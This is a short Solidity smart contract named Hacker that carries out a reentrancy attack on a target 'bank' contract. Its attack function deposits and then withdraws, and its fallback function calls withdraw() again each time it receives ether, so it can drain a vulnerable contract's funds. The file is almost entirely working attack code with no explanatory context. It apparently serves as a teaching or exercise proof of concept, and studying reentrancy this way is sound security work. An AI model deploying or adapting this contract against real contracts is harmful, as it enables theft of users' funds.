// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract Hacker {
    address public bank;
    
    constructor(address _bank) {
        bank = _bank;
    }
    
    function attack() public payable {
        address(bank).call{value: 1 ether}("");
        (bool success, ) = bank.call(abi.encodeWithSignature("deposit()"));
        (success, ) = bank.call(abi.encodeWithSignature("withdraw()"));
    }
    
    fallback() external payable {
        address(bank).call(abi.encodeWithSignature("withdraw()"));
    }
}
